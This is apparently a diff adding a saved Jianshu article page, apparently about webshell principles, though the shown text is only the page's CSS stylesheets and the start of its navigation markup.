+              animation: likeBlast-data-v-6ddd02c6 0.6s 1 steps(19);
+      background-position: right;
+}
+@-webkit-keyframes likeBlast {
+0% {
+    background-position: left;
+}
+100% {
+    background-position: right;
+}
+}
+@keyframes likeBlast-data-v-6ddd02c6 {
+0% {
+    background-position: left;
+}
+100% {
+    background-position: right;
+}
+}
+.like .like-group.active .btn-like[data-v-6ddd02c6]:before {
+      background-position: right;
+}
+</style><style type="text/css">
+@charset "UTF-8";
+/*
+ * 变量
+*/
+.main {
+  position: relative;
+  margin: 0 auto;
+  padding: 0 0 30px 0;
+  width: 620px;
+}
+.main .title {
+    padding-left: 8px;
+    border-left: 3px solid #EA6F5A;
+    line-height: 1;
+    font-size: 15px;
+}
+.main .collection-settings {
+    position: absolute;
+    top: 2px;
+    right: 0;
+    font-size: 13px;
+    color: #A0A0A0;
+}
+.main .collection-settings span {
+      padding-left: 4px;
+}
+.main .include-collection {
+    width: 100%;
+    padding-top: 20px;
+    display: -webkit-box;
+    display: -webkit-flex;
+    display: -ms-flexbox;
+    display: flex;
+    -webkit-box-orient: horizontal;
+    -webkit-box-direction: normal;
+    -webkit-flex-direction: row;
+        -ms-flex-direction: row;
+            flex-direction: row;
+    -webkit-box-pack: start;
+    -webkit-justify-content: flex-start;
+        -ms-flex-pack: start;
+            justify-content: flex-start;
+    -webkit-box-align: center;
+    -webkit-align-items: center;
+        -ms-flex-align: center;
+            align-items: center;
+    -webkit-flex-wrap: wrap;
+        -ms-flex-wrap: wrap;
+            flex-wrap: wrap;
+}
+.main .include-collection .item {
+      display: inline-block;
+      margin: 0 12px 12px 0;
+      min-height: 32px;
+      background-color: white;
+      border: 1px solid #DCDCDC;
+      border-radius: 4px;
+      vertical-align: top;
+      overflow: hidden;
+}
+.main .include-collection .item img {
+        width: 32px;
+        height: 32px;
+}
+.main .include-collection .item .name {
+        display: inline-block;
+        padding: 0 10px;
+        font-size: 14px;
+}
+.main .include-collection .add-collection-wrap {
+      margin: 0 12px 12px 0;
+}
+.main .include-collection .add-collection {
+      padding: 8px 12px;
+      font-size: 14px;
+      border: 1px solid #DCDCDC;
+      border-radius: 4px;
+}
+.main .include-collection .add-collection i {
+        margin-right: 4px;
+        color: #969696;
+}
+.main .recommend-note a {
+    position: relative;
+    margin: 20px 2px 0 0;
+    width: 200px;
+    height: 160px;
+    display: inline-block;
+}
+.main .recommend-note a:after {
+      content: "";
+      position: absolute;
+      width: 200px;
+      height: 160px;
+      border-radius: 0 0 4px 4px;
+      -webkit-box-shadow: inset 0px -80px 50px -22px rgba(0, 0, 0, 0.6);
+              box-shadow: inset 0px -80px 50px -22px rgba(0, 0, 0, 0.6);
+      top: 0;
+      left: 0;
+      z-index: 1;
+}
+.main .recommend-note .name {
+    position: absolute;
+    bottom: 40px;
+    left: 10px;
+    right: 10px;
+    font-size: 17px;
+    font-weight: bold;
+    color: #ffffff;
+    z-index: 2;
+}
+.main .recommend-note .author {
+    position: absolute;
+    bottom: 10px;
+    left: 10px;
+    right: 10px;
+    z-index: 2;
+}
+.main .recommend-note .avatar {
+    width: 20px;
+    height: 20px;
+    display: inline-block;
+}
+.main .recommend-note .avatar img {
+      border-radius: 50%;
+}
+.main .recommend-note .author-name {
+    font-size: 12px;
+    color: #ffffff;
+    display: inline-block;
+    vertical-align: -1px;
+}
+.main .show-more {
+    margin: 0 12px 12px 0;
+    font-size: 14px;
+    color: #A0A0A0;
+}
+</style><style type="text/css">
+#featured-comment-list {
+  margin-top: 30px;
+  margin-bottom: -15px;
+}
+</style><style type="text/css">
+@charset "UTF-8";
+/*
+ * 变量
+*/
+.pc-bind-phone-modal .modal-content, .pc-bind-phone-modal .modal-body {
+  overflow: visible;
+}
+.pc-bind-phone-modal .modal-body {
+  padding-top: 14px;
+}
+.pc-bind-phone-modal .dropdown-menu {
+  max-height: 300px;
+  overflow: auto;
+}
+.pc-bind-phone-modal .dropdown-menu .tag {
+    background-color: #efefef;
+    color: #4A4A4A;
+    height: 28px;
+    line-height: 28px;
+    padding-left: 25px;
+    font-size: 12px;
+}
+.pc-bind-phone-modal .tips {
+  color: #999999;
+  font-size: 13px;
+  font-weight: 500;
+  line-height: 18px;
+  margin-bottom: 14px;
+}
+.pc-bind-phone-modal .tips a {
+    color: #3194D0;
+}
+.reader-night-mode .pc-bind-phone-modal .dropdown-menu .tag {
+  background-color: #2F2F2F;
+  color: #999999;
+}
+</style><style type="text/css">
+@charset "UTF-8";
+/*
+ * 变量
+*/
+.comment-images {
+  display: block;
+  width: 338px;
+  margin-top: 15px;
+  margin-bottom: 15px;
+  position: relative;
+  font-size: 0;
+}
+.comment-images .preview-img {
+    display: block;
+}
+.comment-images .image {
+    position: relative;
+    border-radius: 4px;
+    background-position: center;
+    background-repeat: no-repeat;
+    overflow: hidden;
+    border: 1px solid #f0f0f0;
+}
+body.reader-night-mode .comment-images .image {
+      border-color: #2f2f2f;
+}
+.comment-images .image:not(:nth-child(3n)) {
+      margin-right: 4px;
+}
+.comment-images .image:nth-child(n + 4) {
+      margin-top: 4px;
+}
+.comment-images .image.is-long:after {
+      content: '\957F\56FE';
+      position: absolute;
+      bottom: 0;
+      margin-left: -32px;
+      width: 32px;
+      height: 28px;
+      font-size: 12px;
+      text-align: center;
+      line-height: 28px;
+      background-color: #2f2f2f;
+      opacity: 0.5;
+      color: #fff;
+}
+.comment-images .one-image.is-long {
+    width: 110px;
+    height: 220px;
+    background-position: top left;
+    background-size: 110px auto;
+}
+.comment-images .one-image.is-long:after {
+      left: 100%;
+}
+.comment-images .one-image.is-normal {
+    height: 110px;
+    width: 100%;
+    background-size: contain;
+    background-position: center left;
+}
+.comment-images .many-image {
+    background-size: cover;
+    display: inline-block !important;
+    height: 110px;
+    width: 110px;
+}
+.comment-images .many-image:after {
+      left: 100%;
+}
+.comment-images .sub-image {
+    width: 105px;
+    height: 105px;
+}
+.comment-images .collapsed-btn {
+    display: block;
+    color: #3194d0;
+    font-size: 15px;
+    margin-top: 15px;
+    margin-bottom: 15px;
+}
+.comment-images .mask {
+    position: absolute;
+    right: 0;
+    top: 0;
+    height: 100%;
+    width: 32%;
+    border-radius: 2px;
+    background-color: rgba(47, 47, 47, 0.6);
+    overflow: hidden;
+    pointer-events: none;
+}
+.comment-images .mask span {
+      font-size: 15px;
+      color: #fff;
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      -webkit-transform: translate(-50%, -50%);
+          -ms-transform: translate(-50%, -50%);
+              transform: translate(-50%, -50%);
+      width: 100%;
+      text-align: center;
+}
+</style><style type="text/css">
+@charset "UTF-8";
+/*
+ * 变量
+*/
+.tips-card-loading[data-v-f3bf5228], .tips-card[data-v-f3bf5228] {
+  width: 460px;
+  position: relative;
+  left: 0;
+  top: 0;
+  border-radius: 6px;
+  -webkit-box-sizing: border-box;
+          box-sizing: border-box;
+  background-color: #ffffff;
+  -webkit-box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
+          box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
+  border: 1px solid #d9d9d9;
+}
+.tips-card-loading[data-v-f3bf5228] {
+  height: 200px;
+  display: -webkit-box;
+  display: -webkit-flex;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-orient: horizontal;
+  -webkit-box-direction: normal;
+  -webkit-flex-direction: row;
+      -ms-flex-direction: row;
+          flex-direction: row;
+  -webkit-box-pack: center;
+  -webkit-justify-content: center;
+      -ms-flex-pack: center;
+          justify-content: center;
+  -webkit-box-align: center;
+  -webkit-align-items: center;
+      -ms-flex-align: center;
+          align-items: center;
+  position: relative;
+}
+.tips-card-loading div[data-v-f3bf5228] {
+    background-color: #EAEAEA;
+}
+.tips-card-loading .avatar[data-v-f3bf5228] {
+    width: 72px !important;
+    height: 72px !important;
+    border-radius: 50%;
+    position: absolute;
+    left: 20px;
+    top: 20px;
+}
+.tips-card-loading .name[data-v-f3bf5228] {
+    width: 120px;
+    height: 20px;
+    position: absolute;
+    left: 110px;
+    top: 31px;
+}
+.tips-card-loading .content[data-v-f3bf5228] {
+    position: absolute;
+    left: 110px;
+    top: 62px;
+    width: 238px;
+    height: 39.2px;
+    background-color: transparent;
+}
+.tips-card-loading .content .text[data-v-f3bf5228], .tips-card-loading .content .text-delay[data-v-f3bf5228] {
+      height: 14px;
+      position: absolute;
+      left: 0;
+      width: 100%;
+}
+.tips-card-loading .content .text[data-v-f3bf5228] {
+      top: 2px;
+      -webkit-animation: loading-data-v-f3bf5228 1s ease-in-out infinite;
+      animation: loading-data-v-f3bf5228 1s ease-in-out infinite;
+}
+.tips-card-loading .content .text-delay[data-v-f3bf5228] {
+      bottom: 3px;
+      -webkit-animation: loading-data-v-f3bf5228 1s ease-in-out -0.5s infinite;
+      animation: loading-data-v-f3bf5228 1s ease-in-out -0.5s infinite;
+}
+@keyframes loading-data-v-f3bf5228 {
+0% {
+    width: 60%;
+}
+50% {
+    width: 100%;
+}
+100% {
+    width: 60%;
+}
+}
+@-webkit-keyframes loading {
+0% {
+    width: 60%;
+}
+50% {
+    width: 100%;
+}
+100% {
+    width: 60%;
+}
+}
+.tips-card-loading .meta[data-v-f3bf5228] {
+    width: 30px;
+    height: 42px;
+    position: absolute;
+    bottom: 20px;
+    background-color: transparent;
+}
+.tips-card-loading .meta.meta-1[data-v-f3bf5228] {
+      left: 30px;
+}
+.tips-card-loading .meta.meta-2[data-v-f3bf5228] {
+      left: 90px;
+}
+.tips-card-loading .meta.meta-3[data-v-f3bf5228] {
+      left: 150px;
+}
+.tips-card-loading .meta .count[data-v-f3bf5228], .tips-card-loading .meta .type[data-v-f3bf5228] {
+      position: absolute;
+}
+.tips-card-loading .meta .count[data-v-f3bf5228] {
+      left: -5px;
+      top: 6px;
+      height: 18px;
+      width: 40px;
+}
+.tips-card-loading .meta .type[data-v-f3bf5228] {
+      left: 1px;
+      bottom: 2px;
+      height: 13px;
+      width: 28px;
+}
+.tips-card-loading .button[data-v-f3bf5228] {
+    position: absolute;
+    bottom: 17px;
+    width: 90px;
+    height: 40px;
+    border-radius: 40px;
+}
+.tips-card-loading .message[data-v-f3bf5228] {
+    right: 120px;
+}
+.tips-card-loading .follow[data-v-f3bf5228] {
+    right: 17px;
+}
+.tips-card[data-v-f3bf5228] {
+  z-index: 10;
+}
+.tips-card .card-content[data-v-f3bf5228] {
+    padding: 20px 20px 0 20px;
+}
+.tips-card .card-content .summary[data-v-f3bf5228] {
+      padding: 8px 0 20px 90px;
+      min-height: 92px;
+      position: relative;
+}
+.tips-card .card-content .summary .avatar[data-v-f3bf5228] {
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 72px;
+        height: 72px;
+        cursor: pointer;
+        border-radius: 50%;
+        background-color: #EAEAEA;
+        background-position: center;
+        background-repeat: no-repeat;
+        background-size: cover;
+}
+.tips-card .card-content .summary .name[data-v-f3bf5228] {
+        height: 26px;
+        margin-right: 3px;
+        margin-bottom: 8px;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-orient: horizontal;
+        -webkit-box-direction: normal;
+        -webkit-flex-direction: row;
+            -ms-flex-direction: row;
+                flex-direction: row;
+        -webkit-box-pack: start;
+        -webkit-justify-content: flex-start;
+            -ms-flex-pack: start;
+                justify-content: flex-start;
+        -webkit-box-align: center;
+        -webkit-align-items: center;
+            -ms-flex-align: center;
+                align-items: center;
+}
+.tips-card .card-content .summary .name .nickname[data-v-f3bf5228] {
+          color: #333333;
+          font-size: 19px;
+          font-weight: bold;
+          overflow: hidden;
+          -o-text-overflow: ellipsis;
+             text-overflow: ellipsis;
+          white-space: nowrap;
+          cursor: pointer;
+}
+.tips-card .card-content .summary .name .sex[data-v-f3bf5228], .tips-card .card-content .summary .name .badge[data-v-f3bf5228] {
+          -webkit-flex-shrink: 0;
+              -ms-flex-negative: 0;
+                  flex-shrink: 0;
+          display: inline-block;
+}
+.tips-card .card-content .summary .name .sex[data-v-f3bf5228] {
+          font-size: 19px;
+          width: 19px;
+          margin: 0 4px;
+}
+.tips-card .card-content .summary .intro[data-v-f3bf5228] {
+        overflow: hidden;
+        -o-text-overflow: ellipsis;
+           text-overflow: ellipsis;
+        display: -webkit-box;
+        -webkit-line-clamp: 2;
+        -webkit-box-orient: vertical;
+        margin-bottom: 12px;
+        font-size: 14px;
+        line-height: 1.5;
+        color: #333333;
+}
+.tips-card .card-content .summary .intro.block[data-v-f3bf5228] {
+          color: #999999;
+}
+.tips-card .card-content .summary .list .item[data-v-f3bf5228] {
+        display: block;
+        margin-bottom: 5px;
+        font-size: 13px;
+        color: #999999;
+        cursor: pointer;
+        overflow: hidden;
+        -o-text-overflow: ellipsis;
+           text-overflow: ellipsis;
+        white-space: nowrap;
+}
+.tips-card .card-content .summary .list .item i[data-v-f3bf5228] {
+          margin-right: 2px;
+}
+.tips-card .card-footer[data-v-f3bf5228] {
+    border-top: 1px solid #F0F0F0;
+    padding: 15px;
+    display: -webkit-box;
+    display: -webkit-flex;
+    display: -ms-flexbox;
+    display: flex;
+    -webkit-box-orient: horizontal;
+    -webkit-box-direction: normal;
+    -webkit-flex-direction: row;
+        -ms-flex-direction: row;
+            flex-direction: row;
+    -webkit-box-pack: justify;
+    -webkit-justify-content: space-between;
+        -ms-flex-pack: justify;
+            justify-content: space-between;
+    -webkit-box-align: center;
+    -webkit-align-items: center;
+        -ms-flex-align: center;
+            align-items: center;
+    overflow: hidden;
+    _zoom: 1;
+}
+.tips-card .card-footer .profile[data-v-f3bf5228] {
+      width: 198px;
+      overflow: hidden;
+      _zoom: 1;
+      float: left;
+}
+.tips-card .card-footer .profile div[data-v-f3bf5228] {
+        float: left;
+        width: 60px;
+        height: 44px;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-box-orient: vertical;
+        -webkit-box-direction: normal;
+        -webkit-flex-direction: column;
+            -ms-flex-direction: column;
+                flex-direction: column;
+        -webkit-box-pack: center;
+        -webkit-justify-content: center;
+            -ms-flex-pack: center;
+                justify-content: center;
+        -webkit-box-align: center;
+        -webkit-align-items: center;
+            -ms-flex-align: center;
+                align-items: center;
+}
+.tips-card .card-footer .profile div span[data-v-f3bf5228] {
+          display: block;
+          width: 100%;
+          text-align: center;
+}
+.tips-card .card-footer .profile div .type[data-v-f3bf5228] {
+          font-size: 13px;
+          color: #999999;
+}
+.tips-card .card-footer .profile div .count[data-v-f3bf5228] {
+          font-size: 18px;
+          color: #333333;
+}
+.tips-card .card-footer .social[data-v-f3bf5228] {
+      display: -webkit-box;
+      display: -webkit-flex;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-orient: horizontal;
+      -webkit-box-direction: normal;
+      -webkit-flex-direction: row;
+          -ms-flex-direction: row;
+              flex-direction: row;
+      -webkit-box-pack: end;
+      -webkit-justify-content: flex-end;
+          -ms-flex-pack: end;
+              justify-content: flex-end;
+      -webkit-box-align: center;
+      -webkit-align-items: center;
+          -ms-flex-align: center;
+              align-items: center;
+      float: right;
+      overflow: hidden;
+      _zoom: 1;
+}
+.tips-card .card-footer .social .message[data-v-f3bf5228] {
+        border: 1px solid rgba(59, 194, 29, 0.7);
+        color: #42C02E;
+        margin: 0 10px 0 16px;
+        font-size: 15px;
+        padding: 8px 0;
+        width: 90px;
+        border-radius: 40px;
+        text-align: center;
+        cursor: pointer;
+        float: left;
+        -webkit-box-sizing: border-box;
+                box-sizing: border-box;
+}
+.tips-card .card-footer .social .message[data-v-f3bf5228]:hover {
+          border: 1px solid #42C02E;
+          color: #42C02E;
+          background-color: rgba(59, 194, 29, 0.05);
+}
+.tips-card .card-footer .social .user-follow-button[data-v-f3bf5228] {
+        font-size: 15px;
+        padding: 8px 0;
+        width: 100px;
+}
+.arrow[data-v-f3bf5228] {
+  position: absolute;
+  width: 100%;
+  height: 10px;
+  left: 0;
+  z-index: 20;
+  pointer-events: none;
+}
+.arrow i[data-v-f3bf5228] {
+    position: absolute;
+    left: 50%;
+    margin: 0;
+    margin-left: -10px;
+    border-width: 10px;
+    border-color: transparent;
+    padding: 0;
+}
+.arrow em[data-v-f3bf5228] {
+    display: block;
+    position: absolute;
+    left: -9px;
+    border-width: 9px;
+    border-color: transparent;
+    margin: 0;
+    padding: 0;
+}
+.arrow-type-top[data-v-f3bf5228] {
+  bottom: 1px;
+}
+.arrow-type-top i[data-v-f3bf5228] {
+    border-top-color: #d9d9d9;
+    border-style: solid dashed dashed;
+    top: 0;
+}
+.arrow-type-top em[data-v-f3bf5228] {
+    border-style: solid dashed dashed;
+    border-top-color: #ffffff;
+    top: -10px;
+}
+.arrow-type-bottom[data-v-f3bf5228] {
+  top: 1px;
+}
+.arrow-type-bottom i[data-v-f3bf5228] {
+    border-bottom-color: #d9d9d9;
+    border-style: dashed dashed solid;
+    top: -10px;
+}
+.arrow-type-bottom em[data-v-f3bf5228] {
+    border-style: dashed dashed solid;
+    border-bottom-color: #ffffff;
+    top: -8px;
+}
+.reader-night-mode .tips-card-loading[data-v-f3bf5228] {
+  background-color: #3F3F3F;
+  border-color: #2F2F2F;
+}
+.reader-night-mode .tips-card-loading .avatar[data-v-f3bf5228], .reader-night-mode .tips-card-loading .name[data-v-f3bf5228], .reader-night-mode .tips-card-loading .text[data-v-f3bf5228], .reader-night-mode .tips-card-loading .text-delay[data-v-f3bf5228], .reader-night-mode .tips-card-loading .count[data-v-f3bf5228], .reader-night-mode .tips-card-loading .type[data-v-f3bf5228], .reader-night-mode .tips-card-loading .button[data-v-f3bf5228] {
+    background-color: #545454;
+}
+.reader-night-mode .tips-card[data-v-f3bf5228] {
+  background-color: #3F3F3F;
+  border-color: #2F2F2F;
+}
+.reader-night-mode .tips-card .card-content .summary .name .nickname[data-v-f3bf5228] {
+    color: #C8C8C8;
+}
+.reader-night-mode .tips-card .card-content .summary .name .nickname[data-v-f3bf5228]:hover {
+      color: #ffffff;
+}
+.reader-night-mode .tips-card .card-content .summary .intro[data-v-f3bf5228] {
+    color: #C8C8C8;
+}
+.reader-night-mode .tips-card .card-footer[data-v-f3bf5228] {
+    border-top-color: #2F2F2F;
+}
+.reader-night-mode .tips-card .card-footer .profile div .count[data-v-f3bf5228] {
+      color: #C8C8C8;
+}
+.reader-night-mode .arrow.arrow-type-top em[data-v-f3bf5228] {
+  border-top-color: #3F3F3F;
+}
+.reader-night-mode .arrow.arrow-type-top i[data-v-f3bf5228] {
+  border-top-color: #2F2F2F;
+}
+.reader-night-mode .arrow.arrow-type-bottom em[data-v-f3bf5228] {
+  border-bottom-color: #3F3F3F;
+}
+.reader-night-mode .arrow.arrow-type-bottom i[data-v-f3bf5228] {
+  border-bottom-color: #2F2F2F;
+}
+</style><style type="text/css">
+.v-tooltip-container,
+.v-tooltip-content {
+  display: inline-block;
+}
+.v-tooltip-container {
+  position: relative;
+}
+.v-tooltip-container .v-tooltip-content {
+    -webkit-user-select: none;
+       -moz-user-select: none;
+        -ms-user-select: none;
+            user-select: none;
+}
+.v-tooltip-container .v-tooltip-wrap {
+    position: absolute;
+}
+.v-tooltip-container .v-tooltip-wrap.v-tooltip-wrap-top {
+      bottom: 100%;
+      left: 50%;
+      -webkit-transform: translateX(-50%);
+          -ms-transform: translateX(-50%);
+              transform: translateX(-50%);
+      padding-bottom: 10px;
+}
+.v-tooltip-container .v-tooltip-wrap.v-tooltip-wrap-bottom {
+      top: 100%;
+      left: 50%;
+      -webkit-transform: translateX(-50%);
+          -ms-transform: translateX(-50%);
+              transform: translateX(-50%);
+      padding-top: 10px;
+}
+.v-tooltip-container .v-tooltip-wrap.v-tooltip-wrap-left {
+      top: 50%;
+      right: 100%;
+      -webkit-transform: translateY(-50%);
+          -ms-transform: translateY(-50%);
+              transform: translateY(-50%);
+      padding-right: 10px;
+}
+.v-tooltip-container .v-tooltip-wrap.v-tooltip-wrap-right {
+      top: 50%;
+      left: 100%;
+      -webkit-transform: translateY(-50%);
+          -ms-transform: translateY(-50%);
+              transform: translateY(-50%);
+      padding-left: 10px;
+}
+.v-tooltip-container .v-tooltip-wrap.v-tooltip-wrap-top-start {
+      bottom: 100%;
+      left: 0;
+      padding-bottom: 10px;
+}
+.v-tooltip-container .v-tooltip-wrap.v-tooltip-wrap-top-end {
+      bottom: 100%;
+      right: 0;
+      padding-bottom: 10px;
+}
+.v-tooltip-container .v-tooltip-wrap.v-tooltip-wrap-bottom-start {
+      top: 100%;
+      left: 0;
+      padding-top: 10px;
+}
+.v-tooltip-container .v-tooltip-wrap.v-tooltip-wrap-bottom-end {
+      top: 100%;
+      right: 0;
+      padding-top: 10px;
+}
+.v-tooltip-container .v-tooltip-wrap.v-tooltip-wrap-left-start {
+      top: 0;
+      right: 100%;
+      padding-right: 10px;
+}
+.v-tooltip-container .v-tooltip-wrap.v-tooltip-wrap-left-end {
+      bottom: 0;
+      right: 100%;
+      padding-right: 10px;
+}
+.v-tooltip-container .v-tooltip-wrap.v-tooltip-wrap-right-start {
+      top: 0;
+      left: 100%;
+      padding-left: 10px;
+}
+.v-tooltip-container .v-tooltip-wrap.v-tooltip-wrap-right-end {
+      bottom: 0;
+      left: 100%;
+      padding-left: 10px;
+}
+</style><style type="text/css">
+@charset "UTF-8";
+/*
+ * 变量
+*/
+.like-button[data-v-cdecbe24] {
+  position: relative;
+  padding-left: 23px;
+}
+.like-button[data-v-cdecbe24]:before {
+    content: '';
+    position: absolute;
+    left: -16px;
+    top: -16px;
+    width: 50px;
+    height: 50px;
+    background-image: url(//cdn2.jianshu.io/assets/web/zan_animation_steps-8d65a474b670eb6a022516f4e0b8e9a4.png);
+    background-position: left;
+    background-repeat: no-repeat;
+    background-size: 1050px 50px;
+}
+.like-button[data-v-cdecbe24]:hover:before {
+    background-position: -50px;
+}
+.like-button.zan-animation span[data-v-cdecbe24], .like-button.active span[data-v-cdecbe24] {
+    color: #333333;
+}
+body.reader-night-mode .like-button.zan-animation span[data-v-cdecbe24], body.reader-night-mode .like-button.active span[data-v-cdecbe24] {
+      color: #C8C8C8;
+}
+.like-button.zan-animation[data-v-cdecbe24]:before {
+    -webkit-animation: likeBlast-data-v-cdecbe24 0.6s 1 steps(19);
+            animation: likeBlast-data-v-cdecbe24 0.6s 1 steps(19);
+    background-position: right;
+}
+@-webkit-keyframes likeBlast {
+0% {
+    background-position: -50px;
+}
+100% {
+    background-position: right;
+}
+}
+@keyframes likeBlast-data-v-cdecbe24 {
+0% {
+    background-position: -50px;
+}
+100% {
+    background-position: right;
+}
+}
+.like-button.active[data-v-cdecbe24]:before {
+    background-position: right;
+}
+</style><style type="text/css">
+@charset "UTF-8";
+/*
+ * 变量
+*/
+.recommend-note {
+  margin-bottom: 20px;
+}
+.recommend-note .meta, .recommend-note .list {
+    width: 620px;
+    margin: 0 auto;
+}
+.recommend-note .meta .title {
+    padding-left: 8px;
+    border-left: 3px solid #EA6F5A;
+    line-height: 1;
+    font-size: 15px;
+}
+.recommend-note .meta .title .more {
+      float: right;
+      font-size: 14px;
+      color: #A0A0A0;
+}
+.recommend-note .list {
+    margin-top: 20px;
+}
+.recommend-note .list .note {
+      display: block;
+      margin-bottom: 25px;
+      padding: 0 0 25px 0;
+      border-bottom: 1px solid #DDDDDD;
+}
+.recommend-note .list .note.have-img {
+        min-height: 136px;
+}
+.recommend-note .list .note.have-img.no-user .description {
+          -webkit-line-clamp: 3;
+}
+.recommend-note .list .note .cover {
+        float: right;
+        margin: -5px 0 0 15px;
+        width: 150px;
+        height: 120px;
+        background-position: center;
+        background-repeat: no-repeat;
+        background-size: cover;
+        border-radius: 6px;
+}
+.recommend-note .list .note .title {
+        display: inherit;
+        margin-bottom: 4px;
+        font-size: 18px;
+        line-height: 27px;
+        font-weight: bold;
+        color: #333333;
+        overflow: hidden;
+        -o-text-overflow: ellipsis;
+           text-overflow: ellipsis;
+        white-space: nowrap;
+}
+.recommend-note .list .note .title:hover {
+          text-decoration: underline;
+}
+.recommend-note .list .note .title:visited {
+          color: #999999;
+}
+.recommend-note .list .note .description {
+        margin-bottom: 12px;
+        font-size: 13px;
+        line-height: 23px;
+        color: #333333;
+        overflow: hidden;
+        -o-text-overflow: ellipsis;
+           text-overflow: ellipsis;
+        display: -webkit-box;
+        -webkit-line-clamp: 2;
+        -webkit-box-orient: vertical;
+}
+.recommend-note .list .note .author .avatar {
+        display: inline-block;
+        width: 24px;
+        height: 24px;
+        margin-right: 3px;
+        border-radius: 50%;
+        background-position: center;
+        background-repeat: no-repeat;
+        background-size: cover;
+        vertical-align: middle;
+}
+.recommend-note .list .note .author .name {
+        font-size: 13px;
+        color: #333333;
+        vertical-align: middle;
+}
+</style><style type="text/css">
+@charset "UTF-8";
+/*
+ * 变量
+*/
+.youdao-recommended-ad {
+  position: relative;
+  display: block;
+}
+.youdao-recommended-ad .img {
+    display: block;
+    float: right;
+    width: 150px;
+    height: 120px;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-size: cover;
+    background-color: RGB(241, 243, 244);
+    border-radius: 6px;
+    margin: -5px 0 0 15px;
+}
+body.reader-night-mode .youdao-recommended-ad .img {
+      background-color: #4f4f4f;
+}
+.youdao-recommended-ad .info {
+    overflow: hidden;
+}
+.youdao-recommended-ad .info .title {
+      display: block;
+      color: #333;
+      line-height: 27px;
+      font-size: 18px;
+      font-weight: 700;
+      margin-top: -4px;
+      cursor: pointer;
+}
+body.reader-night-mode .youdao-recommended-ad .info .title {
+        color: #969696;
+}
+.youdao-recommended-ad .info .intro {
+      display: block;
+      font-size: 13px;
+      color: #999;
+      overflow: hidden;
+      -o-text-overflow: ellipsis;
+         text-overflow: ellipsis;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      line-height: 24px;
+      max-height: 48px;
+      -webkit-box-sizing: content-box;
+              box-sizing: content-box;
+      white-space: normal;
+}
+.youdao-recommended-ad .info .ad-badge {
+      position: absolute;
+      left: 0;
+      top: 95px;
+      display: block;
+      width: 38px;
+      height: 18px;
+      line-height: 16px;
+      text-align: center;
+      border-radius: 2px;
+      border: solid 1px #999999;
+      color: #999999;
+      font-size: 12px;
+}
+</style></head><style id="stylish-7" class="stylish" type="text/css">/*
+jianshu reader
+
+拓宽简书的文章阅读界面,看起来更舒服 .
+
+文章内的代码块配色使用Xcode的配色, 如果不喜欢这个样式 . 请从.hljs处删除即可. 文章宽度设置默认为85%
+
+简书 @云中河谷
+*/
+
+.note .post {
+    margin: 0 auto;
+    padding-top: 20px;
+    padding-bottom: 60px;
+    width: 85%
+}
+
+.note .post .article .show-content .image-package {
+    max-width: 100%;
+    padding-bottom: 25px;
+    margin-left: 13.5%;
+    text-align: center
+}
+
+.hljs {
+    display: block;
+    overflow-x: auto;
+    padding: 0.5em;
+    background: #fff;
+    color: black;
+}
+.hljs,pre {
+    background: #f6f6f6;
+    color: #657b83;
+    -webkit-text-size-adjust: none
+}
+.diff .hljs-header,
+.hljs-comment,
+.hljs-doctype,
+.hljs-pi,
+.lisp .hljs-string {
+    color: #006a00;
+}
+.css .hljs-tag,
+.hljs-addition,
+.hljs-keyword,
+.hljs-request,
+.hljs-status,
+.hljs-winutils,
+.method,
+.nginx .hljs-title {
+    color: #aa0d91;
+}
+.hljs-meta {
+    color: #aa0d91;
+}
+.hljs-command,
+.hljs-doctag,
+.hljs-hexcolor,
+.hljs-link_url,
+.hljs-number,
+.hljs-regexp,
+.hljs-rule .hljs-value,
+.hljs-string,
+.hljs-tag .hljs-value,
+.tex .hljs-formula {
+    color: #c41a16;
+}
+.css .hljs-function,
+.hljs-built_in,
+.hljs-chunk,
+.hljs-decorator,
+.hljs-id,
+.hljs-identifier,
+.hljs-localvars,
+.hljs-name,
+.hljs-title,
+.vhdl .hljs-literal {
+    color: #008;
+}
+.hljs-attribute,
+.hljs-class .hljs-title,
+.hljs-constant,
+.hljs-link_reference,
+.hljs-parent,
+.hljs-type,
+.hljs-variable,
+.lisp .hljs-body,
+.smalltalk .hljs-number {
+    color: #9b703f;
+}
+.css .hljs-pseudo,
+.diff .hljs-change,
+.hljs-attr_selector,
+.hljs-cdata,
+.hljs-header,
+.hljs-pragma,
+.hljs-preprocessor,
+.hljs-preprocessor .hljs-keyword,
+.hljs-shebang,
+.hljs-special,
+.hljs-subst,
+.hljs-symbol,
+.hljs-symbol .hljs-string {
+    color: #cb4b16
+}
+.hljs-deletion,
+.hljs-important {
+    color: #0000ff;
+}
+.hljs-link_label {
+    color: #6c71c4
+}
+.tex .hljs-formula {
+    background-color: #eee;
+    font-style: italic;
+    background: #eee8d5
+}</style>
+
+  <!-- 只给10%的用户添加代码 -->
+  <!-- ###第四范式-智能推荐：代码直接复制 无需修改参数### -->
+  <!-- ###功能：上报内容并反馈用户行为### -->
+  <!--
+  -->
+  <body lang="zh-CN" class="reader-black-font"><iframe src="./webshell原理_files/chatbox-frame.html" id="chatbox-iframe" style="display: none;"></iframe><div class="danmuWrapper"></div><div title="浏览当前网站的人数" class="user-count-bubble same-site" style="top: 755px; left: 1490px; opacity: 1.08347;">11</div>
+    <!-- 全局顶部导航栏 -->
+<nav class="navbar navbar-default navbar-fixed-top" role="navigation">
+  <div class="width-limit">
+    <!-- 左上方 Logo -->
+    <a class="logo" href="https://www.jianshu.com/"><img src="./webshell原理_files/nav-logo-4c7bbafe27adc892f3046e6978459bac.png" alt="Nav logo"></a>
+
+    <!-- 右上角 -->
+      <!-- 未登录显示登录/注册/写文章 -->
+      <a class="btn write-btn" target="_blank" href="https://www.jianshu.com/writer#/">
+        <i class="iconfont ic-write"></i>写文章
+</a>      <a class="btn sign-up" id="sign_up" href="https://www.jianshu.com/sign_up">注册</a>
+      <a class="btn log-in" id="sign_in" href="https://www.jianshu.com/sign_in">登录</a>
+
+    <!-- 如果用户登录，显示下拉菜单 -->
+
